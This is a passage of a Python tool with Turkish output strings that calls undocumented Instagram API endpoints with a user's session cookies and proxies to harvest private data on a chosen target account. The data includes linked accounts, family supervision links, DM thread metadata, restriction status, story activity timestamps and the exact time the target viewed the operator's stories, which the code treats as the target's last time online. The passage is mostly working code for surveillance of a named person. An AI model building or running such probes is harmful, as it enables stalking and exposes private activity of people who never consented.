            summary['pending_thread_meta'] = inbox_pending['target_in_pending']

    notes_intel = aggregated['intel'].get('notes', {}).get('notes_get_notes',
                                                             {})
    if notes_intel:
        summary['target_has_active_note'] = notes_intel.get(
            'target_has_active_note')
        if notes_intel.get('target_notes'):
            summary['target_notes'] = notes_intel['target_notes']

    info_dm = aggregated['intel'].get('eligibility', {}).get(
        'info_via_dm_module', {})
    if info_dm and info_dm.get('info_via_dm'):
        idv = info_dm['info_via_dm']
        summary['mutual_followers_count'] = idv.get('mutual_followers_count')
        summary['follow_friction_type'] = idv.get('follow_friction_type')
        summary['live_subscription_status'] = idv.get('live_subscription_status')
        summary['broadcast_chat_preference'] = idv.get(
            'broadcast_chat_preference')

    aggregated['summary'] = summary

    out_path = os.path.join(ARTIFACT_ROOT, target_username,
                              'dm_precheck.json')
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, 'w', encoding='utf-8') as f:
        json.dump(aggregated, f, indent=2, ensure_ascii=False)

    print()
    if summary:
        print(f"  [+] DM PRECHECK SUMMARY:")
        for k, v in summary.items():
            v_str = json.dumps(v, ensure_ascii=False) if isinstance(
                v, (dict, list)) else str(v)
            if len(v_str) > 110:
                v_str = v_str[:110] + '...'
            print(f"      {k:<32} = {v_str}")
    else:
        print(f"  [-] Hiçbir endpoint privacy-relevant intel döndürmedi.")
        print(f"      İlk teşhis için artifacts/<u>/dm_precheck__*.json'a bak.")
    rel = os.path.relpath(out_path, os.path.dirname(os.path.abspath(__file__)))
    print(f"  saved -> {rel}")
    return probes, None


                                                                  
                                                                              
                                                                           
                                                                          
 
                                                                       
                                                                        
                                                                     
 
                                                                          
                                                                       
                                                                      
                                                 
 
                                                             
                                                                      
                                                                          
                                                 
 
                                                                     
                                                                        
                                                                
 
                                                         
                                                                         
                                                           

ACTIVITY_FORENSICS_ENDPOINTS = [
                                                             
    ('GET',  '/api/v1/direct_v2/get_e2ee_capabilities/'
              '?recipient_user_ids=%5B{pk}%5D',
     None, 'e2ee_capabilities', 'capabilities', 'pigeon'),
    ('GET',  '/api/v1/direct_v2/get_secure_messaging_capability/'
              '?user_ids=%5B{pk}%5D',
     None, 'secure_messaging_cap', 'capabilities', 'pigeon'),

                                                                      
                                                          
                                                                 
                                  
    ('GET',  '/api/v1/news/inbox/?mark_as_seen=false&timezone_offset=10800'
              '&show_su=true',
     None, 'news_inbox', 'interactions', 'pigeon'),
    ('GET',  '/api/v1/news/inbox/?mark_as_seen=false&type=you',
     None, 'news_inbox_you', 'interactions', 'pigeon'),

                                                                          
    ('GET',  '/api/v1/feed/reels_tray/?reason=cold_start_fetch',
     None, 'reels_tray_cold', 'story_tray', 'web'),
    ('GET',  '/api/v1/feed/reels_tray/?reason=pull_to_refresh',
     None, 'reels_tray_warm', 'story_tray', 'web'),

                                                           
                                                                  
    ('POST', '/api/v1/direct_v2/initial_load/',
     'persistentBadging=true&push_disabled=true&is_prefetching=false'
     '&recent_user_dialog=false&no_pending_badge=true', 'direct_initial_load',
     'thread_meta', 'pigeon'),

                                      
    ('GET',  '/api/v1/users/{pk}/dms_intervention_check/'
              '?surface=direct_thread',
     None, 'dms_intervention', 'capabilities', 'pigeon'),

                                              
    ('GET',  '/api/v1/restrict_action/restricted_users/',
     None, 'restricted_users', 'capabilities', 'pigeon'),
]


                                                       
                                                                     
                                                                          
                                                                        
                                                                          
 
                                                                            

HIGH_SIGNAL_ENDPOINTS = [
                                                                           
                                                                  
    ('GET',  '/api/v1/discover/ayml/?phone_id=&module=discover_people'
              '&seed_id={pk}',
     None, 'ayml_seed_target', 'discover', 'pigeon'),

                                                                
    ('GET',  '/api/v1/discover/topical_explore/?seed_user_id={pk}'
              '&include_fixed_destinations=true&cluster_id=&max_id=',
     None, 'topical_explore_seed', 'discover', 'pigeon'),

                                                
    ('GET',  '/api/v1/clips/discover/?seed_user_id={pk}',
     None, 'clips_discover_seed', 'discover', 'pigeon'),

                                                                     
    ('GET',  '/api/v1/live/get_post_live_broadcasts_for_user/?user_id={pk}'
              '&num_results=4',
     None, 'past_live_broadcasts', 'media', 'pigeon'),

                                                                          
    ('GET',  '/api/v1/feed/user/{pk}/pinned_media/',
     None, 'pinned_media', 'media', 'pigeon'),

                                                
    ('GET',  '/api/v1/users/{pk}/standalone_fundraisers/',
     None, 'fundraisers', 'media', 'pigeon'),

                                                          
    ('GET',  '/api/v1/users/{pk}/imagine_widget/',
     None, 'imagine_widget', 'identity', 'pigeon'),

                                                                           
                                                        
    ('GET',  '/api/v1/users/{pk}/account_transparency_details/',
     None, 'account_transparency', 'identity', 'pigeon'),

                                                                     
    ('GET',  '/api/v1/bloks/apps/com.instagram.shopping.profile_view/'
              '?params=%7B%22user_id%22%3A%22{pk}%22%7D',
     None, 'bloks_shopping_view', 'media', 'pigeon'),

                                                                        
    ('GET',  '/api/v1/direct_v2/channels/get_channels_for_user/?user_id={pk}',
     None, 'channels_for_user', 'thread', 'pigeon'),

                                                                    
    ('GET',  '/api/v1/direct_v2/roll_call/get_active_roll_calls/?user_id={pk}',
     None, 'roll_call_active', 'thread', 'pigeon'),

                                                                       
    ('GET',  '/api/v1/direct_v2/broadcast_chat/get_chat_consumption_recap_data/'
              '?author_id={pk}',
     None, 'broadcast_consumption', 'thread', 'pigeon'),

                                                                          
    ('GET',  '/api/v1/family_center/list_supervisor_supervisee_link/'
              '?supervised_user_id={pk}',
     None, 'family_center_supervised', 'identity', 'pigeon'),
    ('GET',  '/api/v1/family_center/list_supervisor_supervisee_link/'
              '?supervisor_user_id={pk}',
     None, 'family_center_supervisor', 'identity', 'pigeon'),

                                                                              
    ('GET',  '/api/v1/multiple_accounts/get_account_family/?user_id={pk}',
     None, 'account_family', 'identity', 'pigeon'),

                                                                 
    ('POST', '/api/v1/notes/get_notes_seen_state/',
     'peer_user_ids=%5B{pk}%5D', 'notes_seen_state', 'thread', 'pigeon'),

                                                            
    ('GET',  '/api/v1/usertags/{pk}/feed/?count=24',
     None, 'usertags_feed', 'media', 'pigeon'),

                                                                              
                                                                    
                                                                     
    ('GET',  '/api/v1/direct_v2/ranked_recipients/?mode=raven&query={username}'
              '&show_threads=true',
     None, 'ranked_recipients_query', 'discover', 'pigeon'),
]


def parse_high_signal_response(label, text, target_pk, target_username):
    """Endpoint label'ına göre privacy-relevant field çıkarımı."""
    try:
        d = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return None
    if not isinstance(d, dict):
        return None
    target_pk_str = str(target_pk)
    out = {}

    if label in ('ayml_seed_target', 'topical_explore_seed',
                  'clips_discover_seed'):
                                                                   
        items = (d.get('users')
                  or d.get('suggestions')
                  or d.get('items')
                  or [])
        accounts = []
        for it in items:
            if not isinstance(it, dict):
                continue
            u = it.get('user') or it
            pk = u.get('pk') or u.get('id')
            if not pk:
                continue
            accounts.append({
                'pk': str(pk),
                'username': u.get('username'),
                'full_name': u.get('full_name'),
                'is_private': u.get('is_private'),
                'is_verified': u.get('is_verified'),
            })
        out['discovery_count'] = len(accounts)
        out['discovery_accounts'] = accounts[:30]

    elif label == 'past_live_broadcasts':
        broadcasts = d.get('post_live_items') or d.get('broadcasts') or []
        out['past_live_count'] = len(broadcasts)
        out['past_lives'] = []
        for b in broadcasts[:10]:
            out['past_lives'].append({
                'broadcast_id': b.get('id') or b.get('broadcast_id'),
                'published_time': b.get('published_time'),
                'published_iso': _iso_ms((b.get('published_time') or 0) * 1000)
                                   if b.get('published_time') else None,
                'view_count': b.get('view_count'),
                'media_id': b.get('media_id'),
            })

    elif label == 'pinned_media':
        items = d.get('items') or d.get('pinned_media') or []
        out['pinned_count'] = len(items)
        out['pinned_media_ids'] = [str(it.get('id') or it.get('pk') or '')
                                    for it in items[:10] if isinstance(it, dict)]
                                                                       
        out['pinned_meta'] = []
        for it in items[:5]:
            if not isinstance(it, dict):
                continue
            out['pinned_meta'].append({
                'id': it.get('id'),
                'taken_at': it.get('taken_at'),
                'taken_at_iso': _iso_ms((it.get('taken_at') or 0) * 1000)
                                  if it.get('taken_at') else None,
                'media_type': it.get('media_type'),
                'caption_text': (it.get('caption') or {}).get('text', '')[:200]
                                  if it.get('caption') else None,
                'comment_count': it.get('comment_count'),
                'like_count': it.get('like_count'),
            })

    elif label == 'fundraisers':
        items = d.get('fundraisers') or d.get('items') or []
        out['fundraiser_count'] = len(items)
        out['fundraisers'] = items[:5]

    elif label == 'imagine_widget':
        out['imagine_widget_present'] = bool(d.get('widget'))
        out['imagine_widget_data'] = d.get('widget') or d

    elif label == 'account_transparency':
                                                                               
        out['transparency'] = {k: d.get(k) for k in (
            'country', 'former_usernames', 'account_creation_date',
            'is_verified', 'account_status', 'ads_status',
            'shares_joint_account', 'is_business', 'is_eligible_for_ad_run'
        ) if k in d}
                                
        if 'account_transparency_details' in d:
            out['transparency_details'] = d['account_transparency_details']

    elif label == 'bloks_shopping_view':
                                                                    
        out['bloks_present'] = bool(d.get('layout') or d.get('bloks_payload'))
        out['bloks_size_bytes'] = len(text)

    elif label == 'channels_for_user':
        channels = d.get('channels') or d.get('broadcast_channels') or []
        out['channel_count'] = len(channels)
        out['channels'] = []
        for c in channels[:10]:
            if not isinstance(c, dict):
                continue
            out['channels'].append({
                'channel_id': c.get('id') or c.get('channel_id'),
                'name': c.get('name') or c.get('title'),
                'member_count': c.get('member_count'),
                'last_message_ts': c.get('last_message_at'),
                'last_message_iso': _iso_ms(c.get('last_message_at')),
                'is_pinned': c.get('is_pinned'),
            })

    elif label == 'roll_call_active':
        roll_calls = d.get('roll_calls') or d.get('items') or []
        out['active_roll_calls'] = len(roll_calls)
        out['roll_calls_meta'] = roll_calls[:5]

    elif label == 'broadcast_consumption':
        out['broadcast_keys'] = sorted(d.keys())
        out['broadcast_data'] = {k: d.get(k) for k in (
            'has_active_broadcast', 'broadcast_count', 'last_broadcast_at',
            'subscriber_count', 'total_views_count'
        ) if k in d}

    elif label in ('family_center_supervised', 'family_center_supervisor'):
        links = d.get('links') or d.get('supervisor_supervisee_links') or []
        out['family_link_count'] = len(links)
        out['family_links'] = links[:5]

    elif label == 'account_family':
        accounts = d.get('accounts') or d.get('account_family') or []
        out['linked_account_count'] = len(accounts)
        out['linked_accounts'] = []
        for a in accounts[:10]:
            if not isinstance(a, dict):
                continue
            out['linked_accounts'].append({
                'pk': str(a.get('pk') or a.get('user_id') or ''),
                'username': a.get('username'),
                'full_name': a.get('full_name'),
                'is_primary': a.get('is_primary'),
            })

    elif label == 'notes_seen_state':
        ne = d.get('seen_states') or d.get('notes_seen_state') or {}
        out['seen_state'] = ne
        target_state = (ne.get(target_pk_str)
                          if isinstance(ne, dict) else None)
        if target_state:
            out['target_seen_state'] = target_state

    elif label == 'usertags_feed':
        items = d.get('items') or []
        out['usertag_count'] = len(items)
        out['usertag_media'] = []
        for it in items[:10]:
            if not isinstance(it, dict):
                continue
            owner = it.get('user') or {}
            out['usertag_media'].append({
                'media_id': it.get('id') or it.get('pk'),
                'taken_at': it.get('taken_at'),
                'taken_at_iso': _iso_ms((it.get('taken_at') or 0) * 1000)
                                  if it.get('taken_at') else None,
                'owner_pk': str(owner.get('pk') or ''),
                'owner_username': owner.get('username'),
                'comment_count': it.get('comment_count'),
                'like_count': it.get('like_count'),
            })

    elif label == 'ranked_recipients_query':
        rr = d.get('ranked_recipients') or []
        match = None
        for r in rr:
            u = (r.get('user') or {})
            if str(u.get('pk') or '') == target_pk_str:
                match = {
                    'rank_score': r.get('rank_score'),
                    'is_blocking_reel': u.get('is_blocking_reel'),
                    'has_anonymous_profile_picture':
                        u.get('has_anonymous_profile_picture'),
                    'follower_count': u.get('follower_count'),
                }
                break
        out['ranked_total'] = len(rr)
        out['target_ranked_match'] = match

    return out or None


def run_high_signal_endpoints(target_username, target_pk, cookies, save,
                                proxies):
    """Phase 21: target'ın graph'ında izole çalışan 18 endpoint. Viewer'ın
    aktivitesinden bağımsız."""
    if not cookies or not target_pk:
        return [], None

    viewer_pk = (cookies or {}).get('ds_user_id', '')
    aggregated = {
        'target_pk': str(target_pk),
        'target_username': target_username,
        'viewer_pk': viewer_pk,
        'endpoints_probed': [],
        'intel': {},
    }
    probes = []

    print(f"  [*] {len(HIGH_SIGNAL_ENDPOINTS)} izole high-signal endpoint")

    for entry in HIGH_SIGNAL_ENDPOINTS:
        method, path_tpl, body_tpl, label, intel_key, hdr_strategy = entry
        path = path_tpl.format(pk=target_pk, username=target_username)
        url = f'https://www.instagram.com{path}'
        body = (body_tpl.format(pk=target_pk, username=target_username)
                  if body_tpl is not None else None)
        ct = ('application/x-www-form-urlencoded'
               if method == 'POST' else None)
        if hdr_strategy == 'pigeon':
            h = build_mobile_pigeon_headers(cookies)
            h['x-csrftoken'] = cookies['csrftoken']
            if ct:
                h['content-type'] = ct
        else:
            h = build_dm_web_headers(cookies, target_username,
                                       content_type=ct)
        try:
            if method == 'POST':
                r = requests.post(url, headers=h, cookies=cookies, data=body,
                                   proxies=proxies, timeout=30,
                                   allow_redirects=False)
            else:
                r = requests.get(url, headers=h, cookies=cookies,
                                  proxies=proxies, timeout=30,
                                  allow_redirects=False)
        except requests.exceptions.RequestException as e:
            print(f"  [{method:<4}] {label:<28} EXC {type(e).__name__}")
            time.sleep(0.6)
            continue

        sig = response_signature(r)
        intel = None
        if r.status_code == 200 and r.text.strip().startswith('{'):
            intel = parse_high_signal_response(label, r.text, target_pk,
                                                  target_username)
        plabel = f'highsig__{label}'
        if save:
            ext = ('json' if r.text.strip().startswith('{')
                    or r.text.strip().startswith('[') else 'html')
            save_artifact(target_username, plabel, r.text, ext)

        flag = ''
        if intel:
                                       
            for marker_key in ('discovery_count', 'past_live_count',
                                 'pinned_count', 'fundraiser_count',
                                 'channel_count', 'active_roll_calls',
                                 'family_link_count', 'linked_account_count',
                                 'usertag_count'):
                if intel.get(marker_key, 0) > 0:
                    flag = f" *** {marker_key}={intel[marker_key]}"
                    break
            if not flag:
                if intel.get('imagine_widget_present'):
                    flag = " *** imagine_widget=True"
                elif intel.get('transparency'):
                    flag = f" *** transparency_keys={list(intel['transparency'].keys())[:3]}"
                elif intel.get('bloks_present'):
                    flag = f" *** bloks_present=True ({intel.get('bloks_size_bytes')}B)"
                elif intel.get('target_ranked_match'):
                    flag = " *** target_in_ranked_recipients"
                else:
                    flag = f" intel_keys={list(intel.keys())[:3]}"

        print(f"  [{method:<4}] {label:<28} HTTP {sig['status']:<3} "
              f"{sig['bytes']:>5}B{flag}")

        if intel:
            target_bucket = aggregated['intel'].setdefault(intel_key, {})
            target_bucket[label] = intel
        aggregated['endpoints_probed'].append({
            'label': label, 'method': method, 'path': path,
            'status': sig['status'], 'bytes': sig['bytes'],
            'has_intel': bool(intel),
        })
        probes.append({
            'kind': f'highsig_{label}', 'url': url,
            'label': plabel, 'sig': sig,
            'scan': scan_markers(r.text), 'response': r,
            'high_signal_intel': intel,
        })
        time.sleep(0.5)

                                                              
    summary = {}
    for cat_name, cat in aggregated['intel'].items():
        for endpoint_label, intel in cat.items():
            for k in ('discovery_count', 'past_live_count', 'pinned_count',
                       'fundraiser_count', 'channel_count', 'active_roll_calls',
                       'family_link_count', 'linked_account_count',
                       'usertag_count'):
                if intel.get(k, 0) > 0:
                    summary[f'{endpoint_label}__{k}'] = intel[k]
            if intel.get('discovery_accounts'):
                summary[f'{endpoint_label}__sample'] = [
                    f"@{a['username']}" for a in intel['discovery_accounts'][:5]
                ]
            if intel.get('past_lives'):
                summary[f'{endpoint_label}__most_recent'] = (
                    intel['past_lives'][0])
            if intel.get('pinned_meta'):
                summary[f'{endpoint_label}__most_recent_pinned'] = (
                    intel['pinned_meta'][0])
            if intel.get('channels'):
                summary[f'{endpoint_label}__channel_sample'] = intel[
                    'channels'][:3]
            if intel.get('linked_accounts'):
                summary[f'{endpoint_label}__linked_sample'] = intel[
                    'linked_accounts']
            if intel.get('transparency'):
                summary['transparency'] = intel['transparency']
            if intel.get('imagine_widget_present'):
                summary['imagine_widget_present'] = True
            if intel.get('usertag_media'):
                summary['usertag_media_sample'] = intel['usertag_media'][:3]

    aggregated['summary'] = summary

    out_path = os.path.join(ARTIFACT_ROOT, target_username,
                              'high_signal.json')
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, 'w', encoding='utf-8') as f:
        json.dump(aggregated, f, indent=2, ensure_ascii=False)

    print()
    if summary:
        print(f"  [+] HIGH-SIGNAL SUMMARY:")
        for k, v in summary.items():
            v_str = json.dumps(v, ensure_ascii=False) if isinstance(
                v, (dict, list)) else str(v)
            if len(v_str) > 120:
                v_str = v_str[:120] + '...'
            print(f"      {k:<40} = {v_str}")
    else:
        print(f"  [-] Hiçbir endpoint privacy-relevant intel döndürmedi.")
    rel = os.path.relpath(out_path, os.path.dirname(os.path.abspath(__file__)))
    print(f"  saved -> {rel}")
    return probes, None


def parse_activity_forensics_response(label, text, target_pk, viewer_pk):
    """Endpoint label'ına göre privacy-relevant field çıkarımı.
    Target'a özel filtreleme yapılır — viewer'ın inbox/news feed'inde
    target'ın geçtiği yerleri arar."""
    try:
        d = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return None
    if not isinstance(d, dict):
        return None
    target_pk_str = str(target_pk)
    out = {}

    if label in ('e2ee_capabilities', 'secure_messaging_cap'):
                                                                         
                                                     
        caps = (d.get('recipient_capabilities')
                 or d.get('users')
                 or d.get('user_capabilities')
                 or {})
        if isinstance(caps, dict):
            tcap = caps.get(target_pk_str) or {}
            if tcap:
                out['target_capabilities'] = tcap
                out['is_e2ee_capable'] = tcap.get('is_e2ee_capable')
                out['vanish_mode_enabled'] = tcap.get('vanish_mode_enabled')
                out['cross_app_messaging_capable'] = tcap.get(
                    'cross_app_messaging_capable')

    elif label in ('news_inbox', 'news_inbox_you'):
                                                                 
                                                            
                                                                 
                                                                       
        all_stories = []
        for k in ('new_stories', 'old_stories', 'stories'):
            v = d.get(k) or []
            if isinstance(v, list):
                all_stories.extend(v)

        target_interactions = []
        for s in all_stories:
            if not isinstance(s, dict):
                continue
            args = s.get('args') or {}
                                                                        
            profile_id = str(args.get('profile_id') or '')
            links = args.get('links') or []
            link_ids = [str(l.get('id') or l.get('user_id') or '')
                         for l in links if isinstance(l, dict)]
            text_content = args.get('rich_text') or args.get('text') or ''
            target_in_links = target_pk_str in link_ids
            target_is_profile = profile_id == target_pk_str
            target_in_text = target_pk_str in str(text_content)

            if target_in_links or target_is_profile or target_in_text:
                target_interactions.append({
                    'type': s.get('type'),
                    'story_type': s.get('story_type'),
                    'timestamp': args.get('timestamp'),
                    'timestamp_iso': _iso_ms(
                        (args.get('timestamp') or 0) * 1000)
                        if args.get('timestamp') else None,
                    'text': text_content[:200] if text_content else None,
                    'media_id': args.get('media') and args['media'][0].get('id')
                                  if args.get('media') else None,
                    'profile_id': profile_id,
                })

        out['total_stories_in_inbox'] = len(all_stories)
        out['target_interaction_count'] = len(target_interactions)
        out['target_interactions'] = target_interactions
        out['counts'] = d.get('counts')
        out['last_checked'] = d.get('last_checked')

    elif label in ('reels_tray_cold', 'reels_tray_warm'):
                                                                 
                                                            
        tray = d.get('tray') or []
        target_tray_entry = None
        my_tray_entry = None
        for t in tray:
            if not isinstance(t, dict):
                continue
            u = t.get('user') or {}
            upk = str(u.get('pk') or u.get('id') or '')
            if upk == target_pk_str:
                target_tray_entry = {
                    'latest_reel_media': t.get('latest_reel_media'),
                    'latest_reel_media_iso': _iso_ms(
                        (t.get('latest_reel_media') or 0) * 1000)
                        if t.get('latest_reel_media') else None,
                    'seen': t.get('seen'),
                    'seen_iso': _iso_ms((t.get('seen') or 0) * 1000)
                                  if t.get('seen') else None,
                    'expiring_at': t.get('expiring_at'),
                    'expiring_at_iso': _iso_ms(
                        (t.get('expiring_at') or 0) * 1000)
                        if t.get('expiring_at') else None,
                    'has_besties_media': t.get('has_besties_media'),
                    'has_pride_media': t.get('has_pride_media'),
                    'media_count': t.get('media_count'),
                    'reel_type': t.get('reel_type'),
                    'is_blocked_from_viewer_story': t.get(
                        'is_blocked_from_viewer_story'),
                }
            if upk == str(viewer_pk):
                my_tray_entry = {
                    'latest_reel_media': t.get('latest_reel_media'),
                    'latest_reel_media_iso': _iso_ms(
                        (t.get('latest_reel_media') or 0) * 1000)
                        if t.get('latest_reel_media') else None,
                    'media_ids': [str(m.get('id') or '')
                                    for m in (t.get('items') or [])],
                }
        out['tray_size'] = len(tray)
        out['target_in_tray'] = bool(target_tray_entry)
        out['target_tray_data'] = target_tray_entry
        out['viewer_has_active_story'] = bool(my_tray_entry)
        out['viewer_story_meta'] = my_tray_entry

    elif label == 'direct_initial_load':
                                                                           
        inbox = d.get('inbox') or {}
        threads = inbox.get('threads') or []
        target_threads = []
        latest_overall = None
        for t in threads:
            users = t.get('users') or []
            user_pks = [str(u.get('pk') or u.get('pk_id') or '')
                        for u in users]
            if target_pk_str in user_pks:
                target_threads.append({
                    'thread_id': t.get('thread_id'),
                    'thread_v2_id': t.get('thread_v2_id'),
                    'last_activity_at': t.get('last_activity_at'),
                    'last_activity_iso': _iso_ms(t.get('last_activity_at')),
                    'last_seen_at': t.get('last_seen_at'),
                    'is_pin': t.get('is_pin'),
                    'muted': t.get('muted'),
                    'last_permanent_item': t.get('last_permanent_item'),
                    'thread_type': t.get('thread_type'),
                    'is_group': t.get('is_group'),
                    'read_state': t.get('read_state'),
                })
            ts = t.get('last_activity_at')
            if isinstance(ts, (int, float)) and (latest_overall is None
                                                     or ts > latest_overall):
                latest_overall = ts
        out['inbox_total_threads'] = len(threads)
        out['inbox_unseen_count'] = inbox.get('unseen_count')
        out['inbox_unseen_messages'] = inbox.get('unseen_messages')
        out['most_recent_thread_activity_ts'] = latest_overall
        out['most_recent_thread_activity_iso'] = _iso_ms(latest_overall)
        out['has_thread_with_target'] = bool(target_threads)
        out['target_threads'] = target_threads

    elif label == 'dms_intervention':
        out['intervention_required'] = d.get('intervention_required')
        out['intervention_type'] = d.get('intervention_type')
        out['friction_type'] = d.get('friction_type')
        out['safety_card_required'] = d.get('safety_card_required')
        out['warning_message'] = d.get('warning_message') or d.get('message')

    elif label == 'restricted_users':
        users = d.get('users') or []
        restricted_pks = [str(u.get('pk') or '') for u in users]
        out['restricted_users_count'] = len(restricted_pks)
        out['target_in_restricted_list'] = target_pk_str in restricted_pks

    return out or None


def discover_viewer_active_story(viewer_pk, cookies, proxies):
    """Viewer'ın aktif story'si var mı kontrol; varsa story_id list döner.
    Bu Phase 20 step 3'ün ön koşulu."""
    if not cookies or not viewer_pk:
        return []
    h = build_dm_web_headers(cookies, viewer_pk)
    url = f'https://www.instagram.com/api/v1/feed/reels_media/?reel_ids={viewer_pk}'
    try:
        r = requests.get(url, headers=h, cookies=cookies,
                          proxies=proxies, timeout=30, allow_redirects=False)
    except requests.exceptions.RequestException:
        return []
    if r.status_code != 200:
        return []
    try:
        d = json.loads(r.text)
    except json.JSONDecodeError:
        return []
    reels = d.get('reels') or {}
    my_reel = reels.get(str(viewer_pk)) or {}
    items = my_reel.get('items') or []
    return [str(it.get('id') or it.get('pk') or '') for it in items
            if it.get('id') or it.get('pk')]


def harvest_own_story_viewers(story_id, cookies, proxies, target_pk):
    """Viewer'ın bir story'sinin viewer listesini çek; target geçiyorsa
    seen_at_ts ile dön. UI bunu sıralı liste olarak gösterir; API tam ts
    döndürür (privacy-relevant: target'ın deterministik son online'ı)."""
    if not story_id or not cookies:
        return None
    h = build_dm_web_headers(cookies, '')
    url = (f'https://www.instagram.com/api/v1/media/{story_id}/'
            f'list_reel_media_viewer/?supported_capabilities_new=%5B%5D')
    try:
        r = requests.get(url, headers=h, cookies=cookies,
                          proxies=proxies, timeout=30, allow_redirects=False)
    except requests.exceptions.RequestException:
        return None
    if r.status_code != 200:
        return {'status': r.status_code, 'bytes': len(r.content)}
    try:
        d = json.loads(r.text)
    except json.JSONDecodeError:
        return None
    target_pk_str = str(target_pk)
    users = d.get('users') or []
    target_seen = None
    for u in users:
        upk = str(u.get('pk') or u.get('id') or '')
        if upk == target_pk_str:
            target_seen = {
                'pk': upk,
                'username': u.get('username'),
                'is_emoji_reaction': u.get('is_emoji_reaction'),
                'story_view_type': u.get('story_view_type'),
                                                           
                'seen_at_ts': u.get('seen_at_ts')
                                or u.get('viewed_at')
                                or u.get('viewer_added_ts'),
            }
            if target_seen.get('seen_at_ts'):
                target_seen['seen_at_iso'] = _iso_ms(
                    (target_seen['seen_at_ts'] or 0) * 1000)
            break
    return {
        'story_id': story_id,
        'total_viewers': d.get('total_viewer_count') or len(users),
        'target_viewed_story': bool(target_seen),
        'target_seen_data': target_seen,
        'sample_viewer_count': len(users),
    }


def run_activity_forensics(target_username, target_pk, cookies, save, proxies):
    """Phase 20: ACTIVITY FORENSICS. 8 endpoint + opsiyonel story-viewer
    harvest. En değerli sızıntılar:
      - news_inbox.target_interactions  (target son N gün viewer ile etkileşti)
      - reels_tray.target_tray_data     (target story aktivite ts'leri)
      - own_story_viewer_harvest        (target seen_at — deterministik online)
      - direct_initial_load.target_threads  (geniş thread metadata)
      - e2ee_capabilities.vanish_mode_enabled
    """
    if not cookies or not target_pk:
        return [], None

    viewer_pk = (cookies or {}).get('ds_user_id', '')

    aggregated = {
        'target_pk': str(target_pk),
        'target_username': target_username,
        'viewer_pk': viewer_pk,
        'endpoints_probed': [],
        'intel': {
            'capabilities': {},
            'interactions': {},
            'story_tray': {},
            'thread_meta': {},
            'story_viewer_harvest': None,
        },
    }
    probes = []

    print(f"  [*] {len(ACTIVITY_FORENSICS_ENDPOINTS)} endpoint + "
          f"opsiyonel own-story viewer harvest")
    print(f"  [*] viewer_pk={viewer_pk} -> target_pk={target_pk}")

    for entry in ACTIVITY_FORENSICS_ENDPOINTS:
        method, path_tpl, body_tpl, label, intel_key, hdr_strategy = entry
        path = path_tpl.format(pk=target_pk)
        url = f'https://www.instagram.com{path}'
        body = body_tpl.format(pk=target_pk) if body_tpl is not None else None
        ct = ('application/x-www-form-urlencoded'
               if method == 'POST' else None)
        if hdr_strategy == 'pigeon':
            h = build_mobile_pigeon_headers(cookies)
            h['x-csrftoken'] = cookies['csrftoken']
            if ct:
                h['content-type'] = ct
        else:
            h = build_dm_web_headers(cookies, target_username,
                                       content_type=ct)
        try:
            if method == 'POST':
                r = requests.post(url, headers=h, cookies=cookies, data=body,
                                   proxies=proxies, timeout=30,
                                   allow_redirects=False)
            else:
                r = requests.get(url, headers=h, cookies=cookies,
                                  proxies=proxies, timeout=30,
                                  allow_redirects=False)
        except requests.exceptions.RequestException as e:
            print(f"  [{method:<4}] {label:<26} EXC {type(e).__name__}")
            time.sleep(0.6)
            continue

        sig = response_signature(r)
        intel = None
        if r.status_code == 200 and r.text.strip().startswith('{'):
            intel = parse_activity_forensics_response(
                label, r.text, target_pk, viewer_pk)
        plabel = f'activity__{label}'
        if save:
            ext = 'json' if r.text.strip().startswith('{') else 'html'
            save_artifact(target_username, plabel, r.text, ext)

        flag = ''
        if intel:
            if intel.get('target_interaction_count', 0) > 0:
                flag = (f" *** target_interactions="
                        f"{intel['target_interaction_count']}")
            elif intel.get('target_in_tray'):
                tt = intel.get('target_tray_data') or {}
                flag = (f" *** target_in_tray latest_iso="
                        f"{tt.get('latest_reel_media_iso') or '-'}")
            elif intel.get('viewer_has_active_story'):
                flag = " *** viewer_has_active_story=True"
            elif intel.get('target_threads'):
                flag = (f" *** target_threads="
                        f"{len(intel['target_threads'])}")
            elif intel.get('target_capabilities'):
                tc = intel['target_capabilities']
                flag = f" *** vanish={tc.get('vanish_mode_enabled')}"
            elif intel.get('target_in_restricted_list'):
                flag = " *** target_RESTRICTED"
            elif intel.get('intervention_required'):
                flag = " *** intervention_required=True"
            else:
                flag = f" intel_keys={list(intel.keys())[:3]}"

        print(f"  [{method:<4}] {label:<26} HTTP {sig['status']:<3} "
              f"{sig['bytes']:>5}B{flag}")

        if intel:
            target_bucket = aggregated['intel'].setdefault(intel_key, {})
            target_bucket[label] = intel
        aggregated['endpoints_probed'].append({
            'label': label, 'method': method, 'path': path,
            'status': sig['status'], 'bytes': sig['bytes'],
            'has_intel': bool(intel),
        })
        probes.append({
            'kind': f'activity_{label}', 'url': url,
            'label': plabel, 'sig': sig,
            'scan': scan_markers(r.text), 'response': r,
            'activity_intel': intel,
        })
        time.sleep(0.6)                                                        

                                                           
    print()
    print(f"  [*] Viewer'ın aktif story'si var mı kontrol...")
    story_ids = discover_viewer_active_story(viewer_pk, cookies, proxies)
    if not story_ids:
        print(f"      Viewer'ın aktif story'si yok. Story-viewer harvest atlandı.")
    else:
        print(f"      Viewer'ın {len(story_ids)} aktif story'si var. "
              f"Her birinin viewer listesinde target aranacak.")
        harvest_results = []
        for sid in story_ids[:5]:               
            res = harvest_own_story_viewers(sid, cookies, proxies, target_pk)
            if res is None:
                continue
            harvest_results.append(res)
            mark = ''
            if res.get('target_viewed_story'):
                ts = (res.get('target_seen_data') or {}).get('seen_at_iso')
                mark = f" *** TARGET VIEWED at {ts or '?'}"
            print(f"      story={sid[:24]} viewers={res.get('total_viewers')}"
                  f"{mark}")
            time.sleep(0.6)
        aggregated['intel']['story_viewer_harvest'] = harvest_results

                       
    summary = {}

                
    news = (aggregated['intel'].get('interactions', {})
             .get('news_inbox', {})
             or aggregated['intel'].get('interactions', {})
                  .get('news_inbox_you', {}))
    if news:
        summary['target_interaction_count'] = news.get(
            'target_interaction_count')
        if news.get('target_interactions'):
            summary['target_recent_interactions'] = news['target_interactions']

                
    tray = (aggregated['intel'].get('story_tray', {})
             .get('reels_tray_cold', {})
             or aggregated['intel'].get('story_tray', {})
                  .get('reels_tray_warm', {}))
    if tray:
        summary['target_in_story_tray'] = tray.get('target_in_tray')
        if tray.get('target_tray_data'):
            ttd = tray['target_tray_data']
